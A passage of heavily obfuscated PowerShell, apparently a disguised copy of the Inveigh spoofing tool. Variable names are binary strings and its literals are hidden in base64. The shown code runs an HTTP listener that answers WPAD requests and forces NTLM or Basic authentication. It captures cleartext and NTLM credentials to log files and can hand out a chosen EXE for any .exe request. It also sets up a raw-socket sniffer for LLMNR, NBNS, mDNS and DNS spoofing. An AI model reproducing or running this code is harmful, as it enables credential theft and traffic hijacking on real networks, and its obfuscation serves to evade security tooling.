                ${01000100101011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBFAFQA')))
            }
            elseif((${00000001011001001}).StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA4AC0ANAA1AC0ANAAxAC0ANAA0AC0AMgAwAA==')))))
            {
                ${01000100101011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABFAEEARAA=')))
            }
            elseif((${00000001011001001}).StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABmAC0ANQAwAC0ANQA0AC0ANAA5AC0ANABGAC0ANABFAC0ANQAzAC0AMgAwAA==')))))
            {
                ${01000100101011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBQAFQASQBPAE4AUwA=')))
            }
            elseif((${00000001011001001}).StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAzAC0ANABGAC0ANABFAC0ANABFAC0ANAA1AC0ANAAzAC0ANQA0AA==')))))
            {
                ${01000100101011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBPAE4ATgBFAEMAVAA=')))
            }
            elseif((${00000001011001001}).StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAwAC0ANABGAC0ANQAzAC0ANQA0AC0AMgAwAA==')))))
            {
                ${01000100101011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABPAFMAVAA=')))
            }
            if($NBNSBruteForcePause)
            {
                ${00101000010000101}.NBNS_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                ${00101000010000101}.hostname_spoof = $true
            }
            if(${00000001011001001} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAtADQAOAAtADYARgAtADcAMwAtADcANAAtADMAQQAtADIAMAAtACoA'))))
            {
                ${10011110101111111} = ${00000001011001001}.Substring(${00000001011001001}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA0ADgALQA2AEYALQA3ADMALQA3ADQALQAzAEEALQAyADAALQA=')))) + 19)
                ${10011110101111111} = ${10011110101111111}.Substring(0,${10011110101111111}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwAEQALQAwAEEALQA=')))))
                ${10011110101111111} = ${10011110101111111}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                ${01010011101011011} = New-Object System.String (${10011110101111111},0,${10011110101111111}.Length)
            }
            if(${00000001011001001} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAtADUANQAtADcAMwAtADYANQAtADcAMgAtADIARAAtADQAMQAtADYANwAtADYANQAtADYARQAtADcANAAtADMAQQAtADIAMAAtACoA'))))
            {
                ${00000010010000110} = ${00000001011001001}.Substring(${00000001011001001}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA1ADUALQA3ADMALQA2ADUALQA3ADIALQAyAEQALQA0ADEALQA2ADcALQA2ADUALQA2AEUALQA3ADQALQAzAEEALQAyADAALQA=')))) + 37)
                ${00000010010000110} = ${00000010010000110}.Substring(0,${00000010010000110}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwAEQALQAwAEEALQA=')))))
                ${00000010010000110} = ${00000010010000110}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                ${01000001000101000} = New-Object System.String (${00000010010000110},0,${00000010010000110}.Length)
            }
            if(${01001001001000110} -ne ${01100111110101110} -or ${00000011011111110} -ne ${10101001111101001}.Client.Handle)
            {
                ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${00000110001110101}($HTTPPort) ${01000100101011000} request for ${01100111110101110} received from ${00011111011101100}`:${10000111100010100}") > $null
                ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${00000110001110101}($HTTPPort) host header ${01010011101011011} received from ${00011111011101100}`:${10000111100010100}") > $null
                if(${01000001000101000})
                {
                    ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${00000110001110101}($HTTPPort) user agent received from ${00011111011101100}`:${10000111100010100}`:`n${01000001000101000}") > $null
                }
                if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | ? {${01000001000101000} -match $_}))
                {
                    ${00101000010000101}.output_queue.Add("[*] [$(Get-Date -format s)] ${00000110001110101}($HTTPPort) ignoring wpad.dat request due to user agent match from ${00011111011101100}`:${10000111100010100}") > $null
                }
            }
            if(${00000001011001001} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAtADQAMQAtADcANQAtADcANAAtADYAOAAtADYARgAtADcAMgAtADYAOQAtADcAQQAtADYAMQAtADcANAAtADYAOQAtADYARgAtADYARQAtADMAQQAtADIAMAAtACoA'))))
            {
                ${01100111011100110} = ${00000001011001001}.Substring(${00000001011001001}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA0ADEALQA3ADUALQA3ADQALQA2ADgALQA2AEYALQA3ADIALQA2ADkALQA3AEEALQA2ADEALQA3ADQALQA2ADkALQA2AEYALQA2AEUALQAzAEEALQAyADAALQA=')))) + 46)
                ${01100111011100110} = ${01100111011100110}.Substring(0,${01100111011100110}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwAEQALQAwAEEALQA=')))))
                ${01100111011100110} = ${01100111011100110}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                ${10000100011000110} = New-Object System.String (${01100111011100110},0,${01100111011100110}.Length)
            }
            if((${01100111110101110} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -and $HTTPAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA')))) -or (${01100111110101110} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -and $WPADAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA')))) -or (
            ${01100111110101110} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -and $WPADAuth -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAqAA=='))) -and $WPADAuthIgnore.Count -gt 0 -and ($WPADAuthIgnore | ? {${01000001000101000} -match $_})))
            {
                ${01010110111001010} = 0x32,0x30,0x30
                ${10011100110011000} = 0x4f,0x4b
                ${10111110110101000} = $true
            }
            else
            {
                if((${01100111110101110} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -and $WPADAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))) -or (${01100111110101110} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -and $HTTPAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))))
                {
                    ${01001100011001110} = $true
                }
                else
                {
                    ${01001100011001110} = $false
                }
                if(${10001000111110111})
                {
                    ${01010110111001010} = 0x34,0x30,0x37
                    ${10010110111000011} = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                else
                {
                    ${01010110111001010} = 0x34,0x30,0x31
                    ${10010110111000011} = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                ${10011100110011000} = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
            }
            if(${00000001011001001} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAwAC0ANABmAC0ANQAzAC0ANQA0ACoA'))))
            {
                ${01111101001001111} = ${00000001011001001}.Substring(${00000001011001001}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwAEQALQAwAEEALQAwAEQALQAwAEEALQA=')))) + 12)
                ${01111101001001111} = ${01111101001001111}.Substring(0,${01111101001001111}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQA=')))))
                ${01111101001001111} = ${01111101001001111}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                ${00001011100010011} = New-Object System.String (${01111101001001111},0,${01111101001001111}.Length)
                if(${10110100100011100} -ne ${00001011100010011})
                {
                    ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${00000110001110101}($HTTPPort) POST request ${00001011100010011} captured from ${00011111011101100}`:${10000111100010100}") > $null
                    ${00101000010000101}.POST_request_file_queue.Add(${00001011100010011}) > $null
                    ${00101000010000101}.POST_request_list.Add(${00001011100010011}) > $null
                }
                ${10110100100011100} = ${00001011100010011}
            }
            if(${10000100011000110}.StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA==')))))
            {
                ${10000100011000110} = ${10000100011000110} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))),''
                [Byte[]]${10000001010111001} = [System.Convert]::FromBase64String(${10000100011000110})
                ${01001100111101110} = $false
                if([System.BitConverter]::ToString(${10000001010111001}[8..11]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                {
                    ${00011101000110111} = _01110011010010001 $Challenge ${01001100011001110} ${00011111011101100} ${10101001111101001}.Client.RemoteEndpoint.Port
                }
                elseif([System.BitConverter]::ToString(${10000001010111001}[8..11]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAzAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                {
                    _10100001000011001 ${10000001010111001} "Y" ${00011111011101100} ${10000111100010100} $HTTPPort ${00000110001110101}
                    ${01010110111001010} = 0x32,0x30,0x30
                    ${10011100110011000} = 0x4f,0x4b
                    ${10111110110101000} = $true
                    ${10011110101000110} = $null
                    if(${10001000111110111})
                    {
                        if($HTTPResponse -or $HTTPDirectory)
                        {
                            ${01010000010001111} = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x6e,0x6f,0x2d,0x63,0x61,0x63,0x68,0x65,0x2c,0x20,0x6e,0x6f,0x2d,0x73,0x74,0x6f,0x72,0x65
                        }
                        else
                        {
                            ${00100101001100000} = $false
                        }
                    }
                }
                else
                {
                    ${10111110110101000} = $true
                }
            }
            elseif(${10000100011000110}.StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAIAA=')))))
            {
                ${01010110111001010} = 0x32,0x30,0x30
                ${10011100110011000} = 0x4f,0x4b
                ${10111110110101000} = $true
                ${10000100011000110} = ${10000100011000110} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAIAA='))),''
                [Byte[]]${10000001010111001} = [System.Convert]::FromBase64String(${10000100011000110})
                ${10111001111000111} = [System.BitConverter]::ToString(${10000001010111001})
                ${10111001111000111} = ${10111001111000111} -replace "-",""
                ${10010101010000010} = ${10111001111000111}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgBBADgANgA0ADgAOAA2AEYANwAxADIAMAAxADAAMgAwADIAMAAxADAAMAA='))))
                if(${10010101010000010} -gt 0)
                {
                    ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${00000110001110101}($HTTPPort) authentication method is Kerberos for ${00011111011101100}`:${10000111100010100}") > $null
                    if($Kerberos -eq 'Y')
                    {
                        ${01001100111101110} = $false
                        _00111110011100111 ${10000001010111001} ${01110001010011111} ${00000110001110101} $HTTPPort $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMAAwADEAMQAxADEAMQAwADEAMQAxADAAMQAxADAAMAB9ADoAJAB7ADEAMAAwADAAMAAxADEAMQAxADAAMAAwADEAMAAxADAAMAB9AA==')))
                    }
                }
            }
            elseif(${10000100011000110}.Startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjACAA')))))
            {
                ${01010110111001010} = 0x32,0x30,0x30
                ${10011100110011000} = 0x4f,0x4b
                ${10000100011000110} = ${10000100011000110} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjACAA'))),''
                ${00111110100000001} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${10000100011000110}))
                ${10111110110101000} = $true
                ${00101000010000101}.cleartext_file_queue.Add(${00111110100000001}) > $null
                ${00101000010000101}.cleartext_list.Add(${00111110100000001}) > $null
                ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${00000110001110101}($HTTPPort) Basic authentication cleartext credentials captured from ${00011111011101100}`:${10000111100010100}`:") > $null
                ${00101000010000101}.output_queue.Add(${00111110100000001}) > $null
                if(${00101000010000101}.file_output)
                {
                    ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${00000110001110101}($HTTPPort) Basic authentication cleartext credentials written to " + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAtAEMAbABlAGEAcgB0AGUAeAB0AC4AdAB4AHQA')))) > $null
                }
            }
            if((${01100111110101110} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -and $HTTPAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA')))) -or (${01100111110101110} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -and $WPADAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA')))) -or (
            $WPADAuthIgnore.Count -gt 0 -and $WPADAuth -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAqAA=='))) -and ($WPADAuthIgnore | ? {${01000001000101000} -match $_})) -or ${10111110110101000})
            {
                if($HTTPDirectory -and $HTTPDefaultEXE -and ${01100111110101110} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGUAeABlAA=='))) -and (Test-Path (Join-Path $HTTPDirectory $HTTPDefaultEXE)) -and !(Test-Path (Join-Path $HTTPDirectory ${01100111110101110})))
                {
                    [Byte[]]${00011010100100100} = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTPDefaultEXE))
                    ${00000110000110111} = [System.Text.Encoding]::UTF8.GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAG4AdAAtAFQAeQBwAGUAOgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAGUAeABlAA=='))))
                }
                elseif($HTTPDirectory)
                {
                    if($HTTPDefaultFile -and !(Test-Path (Join-Path $HTTPDirectory ${01100111110101110})) -and (Test-Path (Join-Path $HTTPDirectory $HTTPDefaultFile)) -and ${01100111110101110} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))))
                    {
                        [Byte[]]${00011010100100100} = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTPDefaultFile))
                    }
                    elseif(($HTTPDefaultFile -and ${01100111110101110} -eq '' -or $HTTPDefaultFile -and ${01100111110101110} -eq '/') -and (Test-Path (Join-Path $HTTPDirectory $HTTPDefaultFile)))
                    {
                        [Byte[]]${00011010100100100} = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTPDefaultFile))
                    }
                    elseif($WPADResponse -and ${01100111110101110} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))))
                    {
                        [Byte[]]${00011010100100100} = [System.Text.Encoding]::UTF8.GetBytes($WPADResponse)
                        ${00000110000110111} = [System.Text.Encoding]::UTF8.GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAG4AdAAtAFQAeQBwAGUAOgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAHgALQBuAHMALQBwAHIAbwB4AHkALQBhAHUAdABvAGMAbwBuAGYAaQBnAA=='))))
                    }
                    else
                    {
                        if(Test-Path (Join-Path $HTTPDirectory ${01100111110101110}))
                        {
                            [Byte[]]${00011010100100100} = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory ${01100111110101110}))
                        }
                        else
                        {
                            [Byte[]]${00011010100100100} = [System.Text.Encoding]::UTF8.GetBytes($HTTPResponse)
                        }
                    }
                }
                else
                {
                    if($WPADResponse -and ${01100111110101110} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -and (!$ProxyIgnore -or !($ProxyIgnore | ? {${01000001000101000} -match $_})))
                    {
                        ${10000001001000010} = $WPADResponse
                        ${00000110000110111} = [System.Text.Encoding]::UTF8.GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAG4AdAAtAFQAeQBwAGUAOgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAHgALQBuAHMALQBwAHIAbwB4AHkALQBhAHUAdABvAGMAbwBuAGYAaQBnAA=='))))
                    }
                    elseif($HTTPResponse)
                    {
                        ${10000001001000010} = $HTTPResponse
                        if($HTTPContentType)
                        {
                            ${00000110000110111} = [System.Text.Encoding]::UTF8.GetBytes($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAG4AdAAtAFQAeQBwAGUAOgAgACQASABUAFQAUABDAG8AbgB0AGUAbgB0AFQAeQBwAGUA'))))
                        }
                    }
                    [Byte[]]${00011010100100100} = [System.Text.Encoding]::UTF8.GetBytes(${10000001001000010})
                }
            }
            else
            {
                [Byte[]]${00011010100100100} = [System.Text.Encoding]::UTF8.GetBytes(${10000001001000010})
            }
            ${10010110011001110} = Get-Date -format r
            ${10010110011001110} = [System.Text.Encoding]::UTF8.GetBytes(${10010110011001110})
            if(($HTTPAuth -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAqAA=='))) -and ${01100111110101110} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -or ($WPADAuth -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAqAA=='))) -and ${01100111110101110} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -and !${10111110110101000})
            {
                if($Kerberos -eq 'Y' -and ($KerberosHostHeader.Count -gt 0 -and $KerberosHostHeader -contains ${01010011101011011}))
                {
                    ${01100001000100001} = [System.Text.Encoding]::UTF8.GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUA'))))
                }
                else
                {
                    ${01100001000100001} = [System.Text.Encoding]::UTF8.GetBytes(${00011101000110111})
                }
            }
            elseif(($HTTPAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))) -and ${01100111110101110} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -or ($WPADAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))) -and ${01100111110101110} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))))
            {
                ${01100001000100001} = [System.Text.Encoding]::UTF8.GetBytes($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjACAAcgBlAGEAbABtAD0AJABIAFQAVABQAEIAYQBzAGkAYwBSAGUAYQBsAG0A'))))
            }
            ${01001011101010010} = New-Object System.Collections.Specialized.OrderedDictionary
            ${01001011101010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBSAGUAcwBwAG8AbgBzAGUAVgBlAHIAcwBpAG8AbgA='))),[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
            ${01001011101010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBTAHQAYQB0AHUAcwBDAG8AZABlAA=='))),${01010110111001010} + [Byte[]](0x20))
            ${01001011101010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBSAGUAcwBwAG8AbgBzAGUAUABoAHIAYQBzAGUA'))),${10011100110011000} + [Byte[]](0x0d,0x0a))
            if(${01001100111101110})
            {
                ${10110010000101010} = [System.Text.Encoding]::UTF8.GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdABpAG8AbgA6ACAAYwBsAG8AcwBlAA=='))))
                ${01001011101010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBDAG8AbgBuAGUAYwB0AGkAbwBuAA=='))),${10110010000101010} + [Byte[]](0x0d,0x0a))
            }
            ${01001011101010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBTAGUAcgB2AGUAcgA='))),[System.Text.Encoding]::UTF8.GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAOgAgAE0AaQBjAHIAbwBzAG8AZgB0AC0ASABUAFQAUABBAFAASQAvADIALgAwAA==')))) + [Byte[]](0x0d,0x0a))
            ${01001011101010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBUAGkAbQBlAFMAdABhAG0AcAA='))),[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + ${10010110011001110} + [Byte[]](0x0d,0x0a))
            ${01001011101010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBDAG8AbgB0AGUAbgB0AEwAZQBuAGcAdABoAA=='))),[System.Text.Encoding]::UTF8.GetBytes("Content-Length: $(${00011010100100100}.Length)") + [Byte[]](0x0d,0x0a))
            if(${10010110111000011} -and ${01100001000100001})
            {
                ${01001011101010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBBAHUAdABoAGUAbgB0AGkAYwBhAHQAZQBIAGUAYQBkAGUAcgA='))),${10010110111000011} + ${01100001000100001} + [Byte[]](0x0d,0x0a))
            }
            if(${00000110000110111})
            {
                ${01001011101010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBDAG8AbgB0AGUAbgB0AFQAeQBwAGUA'))),${00000110000110111} + [Byte[]](0x0d,0x0a))
            }
            if(${01010000010001111})
            {
                ${01001011101010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBDAGEAYwBoAGUAQwBvAG4AdAByAG8AbAA='))),${01010000010001111} + [Byte[]](0x0d,0x0a))
            }
            if(${00100101001100000})
            {
                ${01001011101010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBNAGUAcwBzAGEAZwBlAA=='))),[Byte[]](0x0d,0x0a) + ${00011010100100100})
                ${01011101100000101} = _00000110001100101 ${01001011101010010}
                ${10010010011000111}.Write(${01011101100000101},0,${01011101100000101}.Length)
                ${10010010011000111}.Flush()
            }
            sleep -m 10
            ${01001001001000110} = ${01100111110101110}
            if(${10111110110101000})
            {
                if(${10001000111110111})
                {
                    ${10101001111101001}.Client.Close()
                }
                else
                {
                    ${10101001111101001}.Close()
                }
            }
        }
        else
        {
            if(${00000011011111110} -eq ${10101001111101001}.Client.Handle)
            {
                ${01000010011101100}++
            }
            else
            {
                ${01000010011101100} = 0
            }
            if(${01001100111101110} -or ${01000010011101100} -gt 20)
            {
                ${10101001111101001}.Close()
                ${01000010011101100} = 0
            }
            else
            {
                sleep -m 100
            }
        }
    }
    ${10101001111101001}.Close()
    ${00000100000110111}.Stop()
}
${10001100011000101} = 
{
    param ($DNS,$DNSTTL,$EvadeRG,$Inspect,$IP,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$LLMNR,
            $LLMNRTTL,$mDNS,$mDNSTypes,$mDNSTTL,$NBNS,$NBNSTTL,$NBNSTypes,${00110110010110001},$Pcap,
            $PcapTCP,$PcapUDP,$SMB,$SpooferHostsIgnore,$SpooferHostsReply,$SpooferIP,
            $SpooferIPsIgnore,$SpooferIPsReply,$SpooferLearning,$SpooferLearningDelay,$SpooferLearningInterval,
            $SpooferNonprintable,$SpooferThresholdHost,$SpooferThresholdNetwork)
    ${00001110001000011} = $true
    ${00001010100100110} = New-Object System.Byte[] 4	
    ${10100011010000001} = New-Object System.Byte[] 4	
    ${01011100000011010} = New-Object System.Byte[] 65534
    ${00001010100100110}[0] = 1
    ${00001010100100110}[1-3] = 0
    ${10100011010000001}[0] = 1
    ${10100011010000001}[1-3] = 0
    ${01101010010011100} = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
    ${01101010010011100}.SetSocketOption("IP",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABlAGEAZABlAHIASQBuAGMAbAB1AGQAZQBkAA=='))),$true)
    ${01101010010011100}.ReceiveBufferSize = 65534
    if($Kerberos -eq 'Y')
    {
        if($KerberosHash)
        {
            ${01110001010011111} = (&{for (${01100001111100111} = 0;${01100001111100111} -lt $KerberosHash.Length;${01100001111100111} += 2){$KerberosHash.SubString(${01100001111100111},2)}}) -join "-"
            ${01110001010011111} = ${01110001010011111}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        }
        elseif($KerberosCredential)
        {
            ${01110001010011111} = _01000110110111100 ($KerberosCredential.UserName).Trim("\") $KerberosCredential.Password
        }
    }
    try
    {
        ${10000001110101101} = New-Object System.Net.IPEndpoint([System.Net.IPAddress]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAFAA'))),0)
    }
    catch
    {
        ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] Error starting sniffer/spoofer") > $null
        ${01100011111101101} = $_.Exception.Message
        ${01100011111101101} = ${01100011111101101} -replace "`n",""
        ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
        ${00001110001000011} = $false
    }
    ${01101010010011100}.Bind(${10000001110101101})
    ${01101010010011100}.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll,${00001010100100110},${10100011010000001})
    ${10100001110100100} = [System.BitConverter]::GetBytes($DNSTTL)
    [Array]::Reverse(${10100001110100100})
    ${00110011000000110} = [System.BitConverter]::GetBytes($LLMNRTTL)
    [Array]::Reverse(${00110011000000110})
    ${00100001011001001} = [System.BitConverter]::GetBytes($mDNSTTL)
    [Array]::Reverse(${00100001011001001})
    ${01101101001000011} = [System.BitConverter]::GetBytes($NBNSTTL)
    [Array]::Reverse(${01101101001000011})
    ${10111001101101100} = New-Object System.Collections.Generic.List[string]
    ${00011011101111000} = New-Object System.Collections.Generic.List[string]
    if($SpooferLearningDelay)
    {    
        ${01000100110100001} = New-TimeSpan -Minutes $SpooferLearningDelay
        ${10011101110100111} = [System.Diagnostics.Stopwatch]::StartNew()
    }
    [Byte[]]${10101110011000100} = 0xd4,0xc3,0xb2,0xa1,0x02,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff +
        0xff,0x00,0x00,0x01,0x00,0x00,0x00
    if($Pcap -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQA='))))
    {
        ${01010111000110110} = ${00110110010110001} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0AUABhAGMAawBlAHQAcwAuAHAAYwBhAHAA')))
        ${00010100101010001} = [System.IO.File]::Exists(${01010111000110110})
        try
        {
            ${10000101011100101} = New-Object System.IO.FileStream ${01010111000110110},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZAA=')))
            if(!${00010100101010001})
            {
